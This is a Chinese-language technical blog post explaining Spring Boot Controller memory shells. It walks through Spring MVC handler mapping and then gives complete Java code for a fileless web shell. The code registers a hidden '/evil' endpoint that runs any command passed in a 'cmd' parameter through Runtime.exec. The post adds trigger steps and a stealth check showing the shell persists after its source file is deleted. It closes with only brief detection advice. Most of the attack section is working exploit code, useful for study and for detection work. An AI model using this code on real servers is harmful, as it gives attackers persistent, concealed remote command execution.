---
title: "Java 内存马（四）：Spring Boot Controller 内存马"
date: "2025-03-24 21:12:47"
updated: "2026-05-30 19:26:24"
categories: ["文章", "代码审计"]
tags: ["内存马", "Spring Boot"]
thumbnail: ""
first_image_as_thumbnail: true
excerpt: ""
after_post: ""
comments: true
wp_id: "889"
---
<h2 class="md-end-block md-heading"><span class="md-plain">1. 基本概念</span></h2>
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">Spring Boot Controller 内存马</span></strong></span><span class="md-plain"> 是针对 Spring Boot 框架特性设计的内存马，利用 Spring MVC 中 </span><span class="md-pair-s" spellcheck="false"><code>RequestMappingHandlerMapping</code></span><span class="md-plain"> 的动态注册能力，在运行时将恶意 Controller 注入 Spring 容器，无需文件落地即可实现 URL 绑定与恶意逻辑执行。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">核心特点</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">框架依赖</span></strong></span><span class="md-plain">：基于 Spring MVC 组件（</span><span class="md-pair-s" spellcheck="false"><code>DispatcherServlet</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>RequestMappingHandlerMapping</code></span><span class="md-plain">）实现，仅适用于 Spring Boot Web 项目</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">URL 显式触发</span></strong></span><span class="md-plain">：恶意逻辑绑定到特定 URL 路径，需访问该路径才能触发（类似 Servlet 内存马，但更贴合 Spring 生态）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">无文件落地</span></strong></span><span class="md-plain">：无需编写 </span><span class="md-pair-s" spellcheck="false"><code>.class</code></span><span class="md-plain"> 文件或配置 </span><span class="md-pair-s" spellcheck="false"><code>application.properties/yaml</code></span><span class="md-plain">，全程通过内存反射与 API 调用完成注入</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">容器驻留</span></strong></span><span class="md-plain">：注入后持续存在于 Spring 容器中，直至应用重启或主动卸载</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">常见利用场景</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">攻击者通过漏洞（如文件上传、命令执行）在目标 Spring Boot 应用中执行注入代码</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">注入后通过访问预设 URL 传递命令参数（如 </span><span class="md-pair-s" spellcheck="false"><code>cmd=whoami</code></span><span class="md-plain">），实现远程控制</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">注入完成后可删除触发注入的入口文件（如 JSP、恶意接口），仅留存内存中的恶意 Controller</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">2. Spring Boot Controller 正常装载流程（开发者视角）</span></h2>
<p class="md-end-block md-p"><span class="md-plain">要理解内存马原理，需先掌握 Spring Boot 中 Controller 的正常开发与加载逻辑。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">2.1 搭建 Spring Boot 项目</span></h3>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">通过 </span><span class="md-meta-i-c md-link"><a href="https://start.aliyun.com/"><span class="md-plain">阿里云 Spring 初始化平台</span></a></span><span class="md-plain"> 创建项目，选择以下配置：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Spring Boot 版本：2.4.2（文档验证稳定版本，其他 Web 支持版本通用）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">构建工具：Maven</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">依赖组件：</span><span class="md-pair-s "><strong><span class="md-plain">Spring Web</span></strong></span><span class="md-plain">（必须，提供 MVC 与 Servlet 容器支持）</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">下载项目压缩包，解压后用 IDEA 打开，核心项目结构如下：</span></p>



```plaintext
spring-demo/
├── src/
│   └── main/
│       └── java/
│           └── com/example/demo/
│               ├── DemoApplication.java  # 启动类
│               └── demos/web/
│                   └── MyController.java  # 自定义 Controller
└── pom.xml  # 依赖配置
```


</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">2.2 编写 Controller 类</span></h3>
<p class="md-end-block md-p"><span class="md-plain">通过 </span><span class="md-pair-s" spellcheck="false"><code>@RestController</code></span><span class="md-plain"> 和 </span><span class="md-pair-s" spellcheck="false"><code>@RequestMapping</code></span><span class="md-plain"> 注解定义接口，示例代码如下：</span></p>



```java
package com.example.demo.demos.web;
​
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
​
// 标识为 REST 风格 Controller（返回 JSON/字符串，无需视图解析）
@RestController
public class MyController {
    // 绑定 URL 路径 /index，处理 GET/POST 请求
    @RequestMapping("/index")
    public String index() {
        return "index"; // 响应内容
    }
}
```


<h3 class="md-end-block md-heading"><span class="md-plain">2.3 启动与访问</span></h3>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">运行 </span><span class="md-pair-s" spellcheck="false"><code>DemoApplication</code></span><span class="md-plain"> 启动类（含 </span><span class="md-pair-s" spellcheck="false"><code>@SpringBootApplication</code></span><span class="md-plain"> 注解）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">浏览器访问 </span><span class="md-pair-s" spellcheck="false"><code>http://localhost:8080/index</code></span><span class="md-plain">，页面显示 </span><span class="md-pair-s" spellcheck="false"><code>index</code></span><span class="md-plain">，说明 Controller 正常加载</span></p>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">3. Spring Boot Controller 加载流程（框架内部机制）</span></h2>
<p class="md-end-block md-p"><span class="md-plain">通过调试模式跟踪请求流程，可揭示 Spring Boot 如何将 URL 与 Controller 方法绑定。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">3.1 核心请求链路</span></h3>
<p class="md-end-block md-p"><span class="md-plain">当访问 </span><span class="md-pair-s" spellcheck="false"><code>http://localhost:8080/index</code></span><span class="md-plain"> 时，请求经过以下关键步骤：</span></p>

<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Servlet 容器层</span></strong></span><span class="md-plain">：请求先经过 Tomcat 内置容器的 Filter 链（如 </span><span class="md-pair-s" spellcheck="false"><code>WsFilter</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>RequestContextFilter</code></span><span class="md-plain">）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Spring MVC 入口</span></strong></span><span class="md-plain">：进入 </span><span class="md-pair-s" spellcheck="false"><code>DispatcherServlet</code></span><span class="md-plain">（Spring MVC 核心前端控制器）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">请求分发</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>DispatcherServlet.doDispatch()</code></span><span class="md-plain"> 方法负责请求分发，核心逻辑是「找到匹配的 Controller 方法」</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">Handler 映射</span></strong></span><span class="md-plain">：通过 </span><span class="md-pair-s" spellcheck="false"><code>getHandler()</code></span><span class="md-plain"> 方法遍历 </span><span class="md-pair-s" spellcheck="false"><code>handlerMappings</code></span><span class="md-plain"> 列表，找到能处理 </span><span class="md-pair-s" spellcheck="false"><code>/index</code></span><span class="md-plain"> 路径的映射器</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">方法执行</span></strong></span><span class="md-plain">：调用匹配的 Controller 方法（</span><span class="md-pair-s" spellcheck="false"><code>MyController.index()</code></span><span class="md-plain">），返回响应结果</span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">3.2 关键组件解析</span></h3>
<h4 class="md-end-block md-heading"><span class="md-plain">（1）HandlerMapping 列表</span></h4>
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>handlerMappings</code></span><span class="md-plain"> 是 Spring MVC 中用于 URL 与 Controller 映射的核心组件，默认包含 5 个实现类，其中 </span><span class="md-pair-s "><strong><span class="md-pair-s" spellcheck="false"><code>RequestMappingHandlerMapping</code></span></strong></span><span class="md-plain"> 负责处理 </span><span class="md-pair-s" spellcheck="false"><code>@RequestMapping</code></span><span class="md-plain"> 注解的 Controller：</span></p>

<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">映射器类名</span></span></th>
<th><span class="td-span"><span class="md-plain">作用</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">RequestMappingHandlerMapping</span></span></td>
<td><span class="td-span"><span class="md-plain">处理 </span><span class="md-pair-s" spellcheck="false"><code>@RequestMapping</code></span><span class="md-plain"> 注解的 Controller 方法</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">WelcomePageHandlerMapping</span></span></td>
<td><span class="td-span"><span class="md-plain">处理默认首页（如 </span><span class="md-pair-s" spellcheck="false"><code>/</code></span><span class="md-plain"> 路径）</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">BeanNameUrlHandlerMapping</span></span></td>
<td><span class="td-span"><span class="md-plain">通过 Bean 名称作为 URL 路径映射</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">RouterFunctionMapping</span></span></td>
<td><span class="td-span"><span class="md-plain">处理函数式编程风格的路由</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">SimpleUrlHandlerMapping</span></span></td>
<td><span class="td-span"><span class="md-plain">处理简单 URL 与 Handler 的直接映射</span></span></td>
</tr>
</tbody>
</table>
</figure>
<h4 class="md-end-block md-heading"><span class="md-plain">（2）映射注册核心：MappingRegistry</span></h4>
<p class="md-end-block md-p"><span class="md-pair-s" spellcheck="false"><code>RequestMappingHandlerMapping</code></span><span class="md-plain"> 内部通过 </span><span class="md-pair-s "><strong><span class="md-pair-s" spellcheck="false"><code>MappingRegistry</code></span></strong></span><span class="md-plain"> 存储 URL 与 Controller 方法的映射关系，本质是一个内存 Map，结构如下：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Key：URL 路径（如 </span><span class="md-pair-s" spellcheck="false"><code>/index</code></span><span class="md-plain">）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">Value：</span><span class="md-pair-s" spellcheck="false"><code>RequestMappingInfo</code></span><span class="md-plain"> 对象（封装请求方法、路径、参数等匹配规则）+ 对应的 Controller 方法（</span><span class="md-pair-s" spellcheck="false"><code>HandlerMethod</code></span><span class="md-plain">）</span></p>
</li>
</ul>
<h4 class="md-end-block md-heading"><span class="md-plain">（3）正常注册流程</span></h4>
<p class="md-end-block md-p"><span class="md-plain">Spring Boot 启动时，</span><span class="md-pair-s" spellcheck="false"><code>RequestMappingHandlerMapping</code></span><span class="md-plain"> 会自动扫描带有 </span><span class="md-pair-s" spellcheck="false"><code>@Controller</code></span><span class="md-plain">/</span><span class="md-pair-s" spellcheck="false"><code>@RestController</code></span><span class="md-plain"> 注解的类，解析 </span><span class="md-pair-s" spellcheck="false"><code>@RequestMapping</code></span><span class="md-plain"> 注解信息，通过 </span><span class="md-pair-s "><strong><span class="md-pair-s" spellcheck="false"><code>registerHandlerMethod()</code></span></strong></span><span class="md-plain"> 方法将映射关系注册到 </span><span class="md-pair-s" spellcheck="false"><code>MappingRegistry</code></span><span class="md-plain"> 中。</span></p>

<h2 class="md-end-block md-heading"><span class="md-plain">4. 内存马实现机制</span></h2>
<p class="md-end-block md-p"><span class="md-plain">内存马的核心思路是 </span><span class="md-pair-s "><strong><span class="md-plain">跳过 Spring 启动时的自动扫描流程</span></strong></span><span class="md-plain">，在运行时通过反射与框架 API 手动调用 </span><span class="md-pair-s" spellcheck="false"><code>registerHandlerMethod()</code></span><span class="md-plain">，将恶意 Controller 注入 </span><span class="md-pair-s" spellcheck="false"><code>MappingRegistry</code></span><span class="md-plain">。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">4.1 实现步骤拆解</span></h3>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">获取 Spring 上下文</span></strong></span><span class="md-plain">：通过 </span><span class="md-pair-s" spellcheck="false"><code>RequestContextHolder</code></span><span class="md-plain"> 拿到当前请求的 </span><span class="md-pair-s" spellcheck="false"><code>WebApplicationContext</code></span><span class="md-plain">（Spring 容器核心）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">获取映射器实例</span></strong></span><span class="md-plain">：从上下文获取 </span><span class="md-pair-s" spellcheck="false"><code>RequestMappingHandlerMapping</code></span><span class="md-plain"> 对象（负责 Controller 映射注册）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">定义恶意 Controller</span></strong></span><span class="md-plain">：创建含恶意逻辑（如命令执行）的 Controller 类</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">构建映射规则</span></strong></span><span class="md-plain">：通过 </span><span class="md-pair-s" spellcheck="false"><code>RequestMappingInfo</code></span><span class="md-plain"> 定义恶意 Controller 绑定的 URL 路径（如 </span><span class="md-pair-s" spellcheck="false"><code>/evil</code></span><span class="md-plain">）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">注册映射关系</span></strong></span><span class="md-plain">：调用 </span><span class="md-pair-s" spellcheck="false"><code>registerHandlerMethod()</code></span><span class="md-plain"> 将恶意 Controller 方法注册到 </span><span class="md-pair-s" spellcheck="false"><code>MappingRegistry</code></span></p>
</li>
</ol>
<h3 class="md-end-block md-heading"><span class="md-plain">4.2 关键 API 说明</span></h3>
<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">API 方法</span></span></th>
<th><span class="td-span"><span class="md-plain">作用</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>WebApplicationContext.getBean()</code></span></span></td>
<td><span class="td-span"><span class="md-plain">获取 Spring 容器中的 </span><span class="md-pair-s" spellcheck="false"><code>RequestMappingHandlerMapping</code></span><span class="md-plain"> 实例</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>RequestMappingInfo</code></span><span class="md-plain"> 构造方法</span></span></td>
<td><span class="td-span"><span class="md-plain">构建 URL 路径、请求方法等映射规则</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>RequestMappingHandlerMapping.registerMapping()</code></span></span></td>
<td><span class="td-span"><span class="md-plain">将恶意 Controller 方法注册到映射表中</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>RequestContextHolder.getRequestAttributes()</code></span></span></td>
<td><span class="td-span"><span class="md-plain">获取当前请求上下文，用于后续获取请求参数</span></span></td>
</tr>
</tbody>
</table>
</figure>
<h2 class="md-end-block md-heading"><span class="md-plain">5. 示例代码（Spring Boot Controller 内存马）</span></h2>
<p class="md-end-block md-p"><span class="md-plain">以下代码通过一个合法接口 </span><span class="md-pair-s" spellcheck="false"><code>/inject/controller</code></span><span class="md-plain"> 触发内存马注入，注入后可通过 </span><span class="md-pair-s" spellcheck="false"><code>/evil?cmd=xxx</code></span><span class="md-plain"> 执行系统命令。</span></p>

<h3 class="md-end-block md-heading"><span class="md-plain">5.1 注入入口 Controller</span></h3>


```
import org.springframework.context.ApplicationContext;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.springframework.web.context.WebApplicationContext;
import org.springframework.web.context.request.RequestContextHolder;
import org.springframework.web.context.request.ServletRequestAttributes;
import org.springframework.web.servlet.DispatcherServlet;
import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;
import org.springframework.web.servlet.mvc.method.RequestMappingInfo;
import org.springframework.web.servlet.mvc.method.RequestMethodsRequestCondition;
import org.springframework.web.servlet.mvc.method.annotation.PatternsRequestCondition;
​
import javax.servlet.http.HttpServletRequest;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
​
@RestController
public class InjectEntryController {
   // 1. 正常接口（用于测试）
   @RequestMapping("/hello")
   public String hello() {
       return "hello world";
  }
​
   // 2. 内存马注入入口：访问 /inject/controller 触发注入
   @RequestMapping("/inject/controller")
   public String injectController() throws NoSuchMethodException {
       // 步骤1：获取 Spring Web 上下文
       ServletRequestAttributes requestAttributes = (ServletRequestAttributes) RequestContextHolder.getRequestAttributes();
       WebApplicationContext context = (WebApplicationContext) requestAttributes.getAttribute(
               DispatcherServlet.WEB_APPLICATION_CONTEXT_ATTRIBUTE, 0);
​
       // 步骤2：获取 RequestMappingHandlerMapping 实例（核心映射器）
       RequestMappingHandlerMapping mapping = context.getBean(RequestMappingHandlerMapping.class);
​
       // 步骤3：创建恶意 Controller 实例
       EvilController evilController = new EvilController();
​
       // 步骤4：构建映射规则：URL 路径为 /evil，允许所有请求方法（GET/POST）
       PatternsRequestCondition urlPattern = new PatternsRequestCondition("/evil"); // URL 绑定
       RequestMethodsRequestCondition requestMethods = new RequestMethodsRequestCondition(); // 允许所有请求方法
       RequestMappingInfo mappingInfo = new RequestMappingInfo(
               urlPattern,    // URL 模式
               requestMethods,// 请求方法
               null, null, null, null, null
      );
​
       // 步骤5：注册恶意 Controller 方法到映射表
       Method evilMethod = evilController.getClass().getMethod("execCmd"); // 获取恶意方法
       mapping.registerMapping(mappingInfo, evilController, evilMethod); // 注册映射
​
       return "Spring Boot Controller 内存马注入成功！";
  }
​
   // 3. 恶意 Controller：含命令执行逻辑
   @RestController
   public static class EvilController {
       // 恶意方法：处理 /evil 请求，执行 cmd 参数指定的系统命令
       public String execCmd() throws IOException {
           // 获取当前请求对象，用于接收 cmd 参数
           HttpServletRequest request = ((ServletRequestAttributes) RequestContextHolder.getRequestAttributes()).getRequest();
           String cmd = request.getParameter("cmd"); // 命令参数（如 cmd=whoami）
​
           if (cmd == null || cmd.trim().isEmpty()) {
               return "请传入 cmd 参数（如 /evil?cmd=whoami）";
          }
​
           // 执行系统命令并读取结果
           Runtime runtime = Runtime.getRuntime();
           Process process = runtime.exec(cmd);
           BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
​
           StringBuilder result = new StringBuilder();
           String line;
           while ((line = reader.readLine()) != null) {
               result.append(line).append("\n"); // 拼接命令输出
          }
           reader.close();
​
           return "命令执行结果：\n" + result;
      }
  }
}
```


<h2 class="md-end-block md-heading"><span class="md-plain">6. 触发步骤</span></h2>
<ol class="ol-list">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">启动目标应用</span></strong></span><span class="md-plain">：运行含上述代码的 Spring Boot 项目（确保 </span><span class="md-pair-s" spellcheck="false"><code>InjectEntryController</code></span><span class="md-plain"> 被 Spring 扫描到）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">触发内存马注入</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">浏览器访问 </span><span class="md-pair-s" spellcheck="false"><code>http://localhost:8080/inject/controller</code></span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">页面显示 </span><span class="md-pair-s" spellcheck="false"><code>Spring Boot Controller 内存马注入成功！</code></span><span class="md-plain">，说明恶意 Controller 已注册</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">执行恶意逻辑</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">访问 </span><span class="md-pair-s" spellcheck="false"><code>http://localhost:8080/evil?cmd=whoami</code></span><span class="md-plain">（Windows 系统）或 </span><span class="md-pair-s" spellcheck="false"><code>http://localhost:8080/evil?cmd=id</code></span><span class="md-plain">（Linux 系统）</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">页面返回命令执行结果（如当前用户信息）</span></p>
</li>
</ul>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s"><strong><span class="md-plain">隐蔽性验证</span></strong></span><span class="md-plain">：</span></p>

<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">删除 </span><span class="md-pair-s" spellcheck="false"><code>InjectEntryController.java</code></span><span class="md-plain"> 源文件或编译后的 </span><span class="md-pair-s" spellcheck="false"><code>.class</code></span><span class="md-plain"> 文件</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-plain">再次访问 </span><span class="md-pair-s" spellcheck="false"><code>http://localhost:8080/evil?cmd=whoami</code></span><span class="md-plain">，仍能执行命令（内存马驻留）</span></p>
</li>
</ul>
</li>
</ol>
<h2 class="md-end-block md-heading"><span class="md-plain">7. 总结</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">7.1 核心原理对比</span></h3>
<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">对比维度</span></span></th>
<th><span class="td-span"><span class="md-plain">正常 Controller 加载</span></span></th>
<th><span class="td-span"><span class="md-plain">Controller 内存马加载</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">触发时机</span></span></td>
<td><span class="td-span"><span class="md-plain">Spring Boot 启动时自动扫描</span></span></td>
<td><span class="td-span"><span class="md-plain">运行时通过注入入口（如接口）触发</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">依赖文件</span></span></td>
<td><span class="td-span"><span class="md-plain">需 </span><span class="md-pair-s" spellcheck="false"><code>.java</code></span><span class="md-plain"> 源文件或 </span><span class="md-pair-s" spellcheck="false"><code>.class</code></span><span class="md-plain"> 文件</span></span></td>
<td><span class="td-span"><span class="md-plain">无文件落地，全程内存操作</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">注册方式</span></span></td>
<td><span class="td-span"><span class="md-plain">框架自动调用 </span><span class="md-pair-s" spellcheck="false"><code>registerHandlerMethod</code></span></span></td>
<td><span class="td-span"><span class="md-plain">手动反射 / API 调用 </span><span class="md-pair-s" spellcheck="false"><code>registerHandlerMethod</code></span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">可见性</span></span></td>
<td><span class="td-span"><span class="md-plain">可在代码 / 编译产物中找到</span></span></td>
<td><span class="td-span"><span class="md-plain">仅存在于 Spring 容器内存，无迹可寻</span></span></td>
</tr>
</tbody>
</table>
</figure>
<h3 class="md-end-block md-heading"><span class="md-plain">7.2 关键要点</span></h3>
<ul class="ul-list" data-mark="-">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">核心入口</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>RequestMappingHandlerMapping</code></span><span class="md-plain"> 是注入的核心对象，所有 </span><span class="md-pair-s" spellcheck="false"><code>@RequestMapping</code></span><span class="md-plain"> 注解的 Controller 都通过它注册</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">必备条件</span></strong></span><span class="md-plain">：注入时需获取 Spring 上下文（</span><span class="md-pair-s" spellcheck="false"><code>WebApplicationContext</code></span><span class="md-plain">），通常通过 </span><span class="md-pair-s" spellcheck="false"><code>RequestContextHolder</code></span><span class="md-plain"> 或 </span><span class="md-pair-s" spellcheck="false"><code>ServletContext</code></span><span class="md-plain"> 间接获取</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">隐蔽性</span></strong></span><span class="md-plain">：相比 Servlet/Filter 内存马，Controller 内存马更贴合 Spring Boot 正常业务逻辑，URL 路径可伪装成普通接口，更难被察觉</span></p>
</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-pair-s "><strong><span class="md-plain">防御方向</span></strong></span><span class="md-plain">：监控 </span><span class="md-pair-s" spellcheck="false"><code>RequestMappingHandlerMapping.registerMapping</code></span><span class="md-plain"> 方法的异常调用、检测未知 URL 路径（如 </span><span class="md-pair-s" spellcheck="false"><code>/evil</code></span><span class="md-plain md-expand">）的突然出现</span></p>
</li>
</ul>
